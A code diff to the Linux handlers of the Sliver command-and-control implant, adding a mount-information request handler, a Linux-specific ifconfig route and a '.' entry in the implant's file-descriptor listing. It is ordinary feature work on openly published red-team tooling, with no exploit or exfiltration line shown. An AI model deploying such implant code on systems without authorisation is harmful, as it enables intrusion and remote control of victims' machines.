@@ -31,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/mount"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -57,7 +58,7 @@ var (
 		sliverpb.MsgMvReq:        mvHandler,
 		sliverpb.MsgCpReq:        cpHandler,
 		sliverpb.MsgTaskReq:      taskHandler,
-		sliverpb.MsgIfconfigReq:  ifconfigHandler,
+		sliverpb.MsgIfconfigReq:  ifconfigLinuxHandler,
 		sliverpb.MsgExecuteReq:   executeHandler,
 		sliverpb.MsgEnvReq:       getEnvHandler,
 		sliverpb.MsgSetEnvReq:    setEnvHandler,
@@ -71,6 +72,7 @@ var (
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgProcessDumpReq: dumpHandler,
+		sliverpb.MsgMountReq:       mountHandler,
 		sliverpb.MsgGrepReq:        grepHandler,
 
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
@@ -124,6 +126,27 @@ func dumpHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func mountHandler(data []byte, resp RPCResponse) {
+	mountReq := &sliverpb.MountReq{}
+	err := proto.Unmarshal(data, mountReq)
+	if err != nil {
+		return
+	}
+
+	mountData, err := mount.GetMountInformation()
+	mountResp := &sliverpb.Mount{
+		Info:     mountData,
+		Response: &commonpb.Response{},
+	}
+
+	if err != nil {
+		mountResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(mountResp)
+	resp(data, err)
+}
+
 func taskHandler(data []byte, resp RPCResponse) {
 	var err error
 	task := &sliverpb.TaskReq{}
@@ -167,7 +190,7 @@ func memfilesListHandler(_ []byte, resp RPCResponse) {
 
 	pid := os.Getpid()
 	path := fmt.Sprintf("/proc/%d/fd/", pid)
-	dir, files, err := getDirList(path)
+	dir, rootDirEntry, files, err := getDirList(path)
 
 	// Convert directory listing to protobuf
 	timezone, offset := time.Now().Zone()
@@ -178,6 +201,19 @@ func memfilesListHandler(_ []byte, resp RPCResponse) {
 		dirList.Exists = false
 	}
 	dirList.Files = []*sliverpb.FileInfo{}
+	rootDirInfo, err := rootDirEntry.Info()
+	if err == nil {
+		// We should not get an error because we created the DirEntry object from the FileInfo object
+		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
+			Name:    ".", // Cannot use the name from the FileInfo / DirEntry because that is the name of the directory
+			Size:    rootDirInfo.Size(),
+			ModTime: rootDirInfo.ModTime().Unix(),
+			Mode:    rootDirInfo.Mode().String(),
+			Uid:     getUid(rootDirInfo),
+			Gid:     getGid(rootDirInfo),
+			IsDir:   rootDirInfo.IsDir(),
+		})
+	}
 
 	for _, dirEntry := range files {
 		//log.Printf("File: %s\n", dirEntry.Name())
